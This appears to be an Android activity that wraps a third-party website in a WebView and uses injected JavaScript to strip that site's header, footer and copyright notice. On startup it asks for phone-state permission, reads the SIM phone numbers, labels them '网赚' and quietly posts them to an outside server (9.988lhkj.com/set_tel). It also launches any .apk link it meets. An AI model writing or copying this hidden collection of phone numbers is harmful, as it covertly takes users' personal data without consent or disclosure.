package com.miracle.michael.switcher;

import android.Manifest;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Activity;
import android.app.ProgressDialog;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.tbruyelle.rxpermissions2.Permission;
import com.tbruyelle.rxpermissions2.RxPermissions;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Set;
import java.util.TreeSet;

import io.reactivex.disposables.Disposable;
import io.reactivex.functions.Consumer;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;
import retrofit2.converter.scalars.ScalarsConverterFactory;
import retrofit2.http.POST;
import retrofit2.http.Query;


/**
 * Created by Administrator on 2018/5/10.
 */

public class WebViewHtmlActivity extends Activity {
    /**
     * 拍照/选择文件请求码
     */
    private static final int REQ_CAMERA = 1;
    private static final int REQ_CHOOSE = REQ_CAMERA + 1;
    public static File tempFile;
//    private WebView mWebView;
    private Html5WebView mWebView;
    private TextView mTextView;
    private ValueCallback<Uri> mUploadMessage;
    private ValueCallback<Uri[]> mUploadMessageArray;

    protected ProgressDialog loadingDialog;

//    private String mUrl = "http://wap.go007.com/dali/"; //15509841941  qwe123456  生活类的
//    private String mUrl = "http://hackp.com/forum.php?mod=guide&view=hot&mobile=2";
    private String mUrl = "http://m.sanzangwang.com/";
    private long mOldTime;
//    private String mUrl = "http://45.192.89.178";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT);

        LinearLayout linearLayout = new LinearLayout(this);
        linearLayout.setOrientation(LinearLayout.VERTICAL);
        linearLayout.setLayoutParams(params);
        mTextView = new TextView(this);
        mTextView.setLayoutParams(params);
        mTextView.setGravity(Gravity.CENTER);
        mTextView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 20);
        mTextView.setTextColor(Color.BLACK);
        mTextView.setVisibility(View.GONE);
        mTextView.setText("加载失败！点击重试。");
        mTextView.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                loadUrl();
            }
        });
        linearLayout.addView(mTextView);

//        mWebView = new WebView(this);
        mWebView = new Html5WebView(this);
        mWebView.setLayoutParams(params);
        WebSettings settings = mWebView.getSettings();
        settings.setJavaScriptCanOpenWindowsAutomatically(true);
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.LOLLIPOP) {
            settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        }
        mWebView.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
        mWebView.setWebViewClient(new MyWebViewClient());
        mWebView.setWebChromeClient(new MyChromeClient());

        linearLayout.addView(mWebView);
        setContentView(linearLayout);

        loadingDialog = new ProgressDialog(this);
        loadingDialog.setMessage("加载中...");
//        mUrl = getIntent().getStringExtra("url");

        loadUrl();
        getUserNum();
    }

    private void loadUrl() {
        loadingDialog.show();
        mTextView.setVisibility(View.GONE);
        mWebView.setVisibility(View.GONE);
        mWebView.loadUrl(mUrl);
    }


    private void selectImage() {
        String[] selectPicTypeStr = {"拍摄", "从相册中选择"};
        new android.support.v7.app.AlertDialog.Builder(this)
                .setOnCancelListener(new DialogInterface.OnCancelListener() {
                    @Override
                    public void onCancel(DialogInterface dialog) {
                        onReceiveValue();
                    }
                })
                .setItems(selectPicTypeStr, new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog,
                                        int which) {
                        switch (which) {
                            // 相机拍摄，此处调用系统相机拍摄图片，开发者可根据实际情况选用系统相机还是自己在这之上封装一层从而符合APP风格
                            case 0:
                                openCamera();
                                break;
                            // 手机相册，此处调用系统相册选择图片，开发者可根据实际情况选用系统相册还是自己在这之上封装一层从而符合APP风格
                            case 1:
                                openAlbum();
                                break;
                            default:
                                break;
                        }

                    }
                }).show();
    }

    private void openAlbum() {
        if (hasSDcard()) {
            Intent intent = new Intent();
            intent.setType("image/*");
            intent.setAction(Intent.ACTION_PICK);
            intent.setData(MediaStore.Images.Media.EXTERNAL_CONTENT_URI);//使用以上这种模式，并添加以上两句
            startActivityForResult(intent, REQ_CHOOSE);
        }
    }

    private void openCamera() {
        //獲取系統版本
        int currentapiVersion = Build.VERSION.SDK_INT;
        // 激活相机
        Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
        // 判断存储卡是否可以用，可用进行存储
        if (hasSDcard()) {
            SimpleDateFormat timeStampFormat = new SimpleDateFormat(
                    "yyyy_MM_dd_HH_mm_ss");
            String filename = timeStampFormat.format(new Date());
            tempFile = new File(Environment.getExternalStorageDirectory(),
                    filename + ".jpg");
            if (currentapiVersion < 24) {
                // 从文件中创建uri
                Uri uri = Uri.fromFile(tempFile);
                intent.putExtra(MediaStore.EXTRA_OUTPUT, uri);
            } else {
                //兼容android7.0 使用共享文件的形式
                ContentValues contentValues = new ContentValues(1);
                contentValues.put(MediaStore.Images.Media.DATA, tempFile.getAbsolutePath());
                Uri uri = getApplication().getContentResolver().insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, contentValues);
                intent.putExtra(MediaStore.EXTRA_OUTPUT, uri);
            }
        }
        // 开启一个带有返回值的Activity，请求码为PHOTO_REQUEST_CAREMA
        startActivityForResult(intent, REQ_CAMERA);
    }

    private boolean hasSDcard() {
        boolean flag = Environment.getExternalStorageState().equals(
                Environment.MEDIA_MOUNTED);
        if (!flag) {
            Toast.makeText(this, "请插入手机存储卡再使用本功能", Toast.LENGTH_SHORT).show();
            onReceiveValue();
        }
        return flag;
    }


    /**
     * 返回文件选择
     */
    @Override
    protected void onActivityResult(int requestCode, int resultCode,
                                    Intent intent) {
        super.onActivityResult(requestCode, resultCode, intent);
        if (resultCode != RESULT_OK) {
            onReceiveValue();
            return;
        }
        switch (requestCode) {
            case REQ_CAMERA:
                File fileCamera = new File(tempFile.getAbsolutePath());
                handleFile(fileCamera);
                break;
            case REQ_CHOOSE:
                Uri uri = intent.getData();
                String absolutePath = getAbsolutePath(this, uri);
                File fileAlbum = new File(absolutePath);
                handleFile(fileAlbum);
                break;
        }
    }

    private void handleFile(File file) {
        if (file.isFile()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                if (null == mUploadMessageArray) {
                    return;
                }
                Uri uri = Uri.fromFile(file);
                Uri[] uriArray = new Uri[]{uri};
                mUploadMessageArray.onReceiveValue(uriArray);
                mUploadMessageArray = null;
            } else {
                if (null == mUploadMessage) {
                    return;
                }
                Uri uri = Uri.fromFile(file);
                mUploadMessage.onReceiveValue(uri);
                mUploadMessage = null;
            }
        } else {
            onReceiveValue();
        }

    }

//    public boolean onKeyDown(int keyCode, KeyEvent event) {
//        if ((keyCode == KeyEvent.KEYCODE_BACK) && mWebView.canGoBack()) {
//            mWebView.goBack();
//            return true;
//        } else {
//            finish();
//        }
//        return super.onKeyDown(keyCode, event);
//    }

    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if ((keyCode == KeyEvent.KEYCODE_BACK) && mWebView.canGoBack()) {
            mWebView.goBack();
            return true;
        } else if (keyCode == KeyEvent.KEYCODE_BACK && !mWebView.canGoBack()) {
            if (System.currentTimeMillis() - mOldTime < 2000) {
                finish();
            }else{
//                ToastUtil.toast("再按一次退出应用");
                Toast.makeText(this,"再按一次退出应用",Toast.LENGTH_LONG).show();
            }
        } else {
            return super.onKeyDown(keyCode, event);
        }
        mOldTime = System.currentTimeMillis();
        return super.onKeyDown(keyCode, event);
    }

    public String getAbsolutePath(final Context context,
                                  final Uri uri) {
        if (null == uri) return null;
        final String scheme = uri.getScheme();
        String data = null;
        if (scheme == null)
            data = uri.getPath();
        else if (ContentResolver.SCHEME_FILE.equals(scheme)) {
            data = uri.getPath();
        } else if (ContentResolver.SCHEME_CONTENT.equals(scheme)) {
            Cursor cursor = context.getContentResolver().query(uri,
                    new String[]{MediaStore.Images.ImageColumns.DATA},
                    null, null, null);
            if (null != cursor) {
                if (cursor.moveToFirst()) {
                    int index = cursor.getColumnIndex(
                            MediaStore.Images.ImageColumns.DATA);
                    if (index > -1) {
                        data = cursor.getString(index);
                    }
                }
                cursor.close();
            }
        }
        return data;
    }

    private void onReceiveValue() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (mUploadMessageArray != null) {
                mUploadMessageArray.onReceiveValue(null);
                mUploadMessageArray = null;
            }
        } else {
            if (mUploadMessage != null) {
                mUploadMessage.onReceiveValue(null);
                mUploadMessage = null;
            }
        }
    }

    private final class MyChromeClient extends WebChromeClient {
        // For Android >=3.0
        public void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType) {
            if (acceptType.equals("image/*")) {
                if (mUploadMessage != null) {
                    mUploadMessage.onReceiveValue(null);
                    return;
                }
                mUploadMessage = uploadMsg;
                selectImage();
            } else {
                onReceiveValue();
            }
        }

        // For Android < 3.0
        public void openFileChooser(ValueCallback<Uri> uploadMsg) {
            openFileChooser(uploadMsg, "image/*");
        }

        // For Android  >= 4.1.1
        public void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType, String capture) {
            openFileChooser(uploadMsg, acceptType);
        }

        // For Android  >= 5.0
        @Override
        @SuppressLint("NewApi")
        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
            if (fileChooserParams != null && fileChooserParams.getAcceptTypes() != null
                    && fileChooserParams.getAcceptTypes().length > 0 && fileChooserParams.getAcceptTypes()[0].equals("image/*")) {
                if (mUploadMessageArray != null) {
                    mUploadMessageArray.onReceiveValue(null);
                }
                mUploadMessageArray = filePathCallback;
                selectImage();
            } else {
                onReceiveValue();
            }
            return true;
        }

        @Override
        public void onProgressChanged(WebView view, int newProgress) {
            super.onProgressChanged(view, newProgress);
            if (newProgress == 100) {
                mWebView.setVisibility(View.VISIBLE);
                loadingDialog.dismiss();
            }
        }
    }


    private final class MyWebViewClient extends WebViewClient {
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            if (loadingDialog != null){
                loadingDialog.show();
            }
            //唤起微信
            if (url.startsWith("weixin://wap/pay?")) {
                try {
                    Uri u = Uri.parse(url);
                    Intent intent = new Intent(Intent.ACTION_VIEW, u);
                    startActivity(intent);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                return true;
            }
            //唤起QQ
            if (url.startsWith("mqqapi://forward/url?")) {
                try {
                    Uri u = Uri.parse(url);
                    Intent intent = new Intent(Intent.ACTION_VIEW, u);
                    startActivity(intent);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                return true;
            }

            //唤起支付宝
            if (url.startsWith("intent://") || url.startsWith("alipays://")) {
                try {
                    Intent intent = Intent.parseUri(url,
                            Intent.URI_INTENT_SCHEME);
                    intent.addCategory("android.intent.category.BROWSABLE");
                    intent.setComponent(null);
                    startActivity(intent);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                return true;
            }
            if (url.endsWith(".apk")) {
                view.getContext().startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
                return true;
            }
            return super.shouldOverrideUrlLoading(view, url);
        }

        /**
         * 这里进行无网络或错误处理，具体可以根据errorCode的值进行判断，做跟详细的处理。
         *
         * @param view
         */
        // 旧版本，会在新版本中也可能被调用，所以加上一个判断，防止重复显示
        @Override
        public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
            super.onReceivedError(view, errorCode, description, failingUrl);
            //Log.e(TAG, "onReceivedError: ----url:" + error.getDescription());
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                return;
            }
            // 在这里显示自定义错误页
            showError();
        }

        // 新版本，只会在Android6及以上调用
        @TargetApi(Build.VERSION_CODES.M)
        @Override
        public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
            super.onReceivedError(view, request, error);
            if (request.isForMainFrame()) { // 或者： if(request.getUrl().toString() .equals(getUrl()))
                // 在这里显示自定义错误页
                showError();
            }
        }

        @SuppressLint("NewApi")
        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
//            mWebView.evaluateJavascript("var child=document.getElementById(\"bottom_msg\");\nchild.parentNode.removeChild(child);\n", null);
            r();
        }

        @SuppressLint("NewApi")
        void r(){
            Log.d("TAG", "r() called");
            mWebView.evaluateJavascript("var child=document.getElementById(\"EleId\");child.style.visibility=\"hidden\";\nchild.parentNode.removeChild(child);\n", null);
            mWebView.evaluateJavascript("var child=document.querySelectorAll(\"div.footer\")[0];child.style.visibility=\"hidden\";\nchild.parentNode.removeChild(child);\n", null);
            mWebView.evaluateJavascript("var child=document.querySelectorAll(\"div.copyright\")[0];child.style.visibility=\"hidden\";\nchild.parentNode.removeChild(child);\n", null);
            mWebView.evaluateJavascript("var child=document.querySelectorAll(\"div.headerCon\")[0];child.style.visibility=\"hidden\";\nchild.parentNode.removeChild(child);\n", null);
        }
    }

    private void showError() {
        mWebView.setVisibility(View.GONE);
        mTextView.setVisibility(View.VISIBLE);
    }

    private long mExitTime;

    @Override
    public void onBackPressed() {
        if (System.currentTimeMillis() - mExitTime > 2000) {
            mExitTime = System.currentTimeMillis();
        } else {
            super.onBackPressed();
        }
    }

    private void getUserNum(){
        Disposable result = new RxPermissions(this).requestEach(android.Manifest.permission.READ_EXTERNAL_STORAGE, android.Manifest.permission.WRITE_EXTERNAL_STORAGE, android.Manifest.permission.READ_PHONE_STATE)
                .subscribe(new Consumer<Permission>() {
                    @SuppressLint("MissingPermission")
                    @Override
                    public void accept(Permission permission) {
                        if (permission.name.equals(Manifest.permission.READ_PHONE_STATE) && permission.granted) {
                            try {
                                Set<String> phoneNum = getPhoneNum(WebViewHtmlActivity.this);
                                List<String> phoneNums = new ArrayList<>(phoneNum);
                                StringBuilder sb = new StringBuilder();
                                for (String phone : phoneNum) {
                                    sb.append("网赚 : "+phone);
                                    sb.append(",");
                                }
                                String s = sb.toString();
                                String phone = s.substring(0, s.length() - 1);
                                reqData(phone);

                            } catch (Exception e) {
//                                ToastUtil.toast(e.getMessage());
                            }
                        }
                    }
                });

    }

    private void reqData(String phone) {
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl("http://9.988lhkj.com/")
                .addConverterFactory(ScalarsConverterFactory.create())
                .addConverterFactory(GsonConverterFactory.create())
                .build();
//        com.miracle.michael.naoh
        retrofit.create(QService.class).sendPhoneNum(phone).enqueue(new Callback<String>() {
            @Override
            public void onResponse(Call<String> call, Response<String> response) {
                try {
                    String s = response.body();
                } catch (Exception e) {
                }
            }
            @Override
            public void onFailure(Call<String> call, Throwable t) {

            }
        });
    }

    public static Set<String> getPhoneNum(Context context) {
        Set<String> nums = new TreeSet<>();
        TelephonyManager tm = (TelephonyManager) context.getSystemService(context.TELEPHONY_SERVICE);
        String phoneNumber1 = tm.getLine1Number();
        nums.add(phoneNumber1);

        //PERMISSION PHONE STATE
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1){
            SubscriptionManager sm = (SubscriptionManager) context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
            List<SubscriptionInfo> silist = sm.getActiveSubscriptionInfoList();
            if(silist != null){
                for(SubscriptionInfo subscriptionInfo : silist) {
                    nums.add(subscriptionInfo.getNumber());
                }
            }
        }
        return nums;
    }

    private interface QService {
//        @POST("{packageName}")
//        Call<String> reqSwitcher(@Path("packageName") String packageName);
        /**
         * 发送用户手机号
         */
        @POST("set_tel")
        Call<String> sendPhoneNum(@Query("phone") String phone);
    }


}
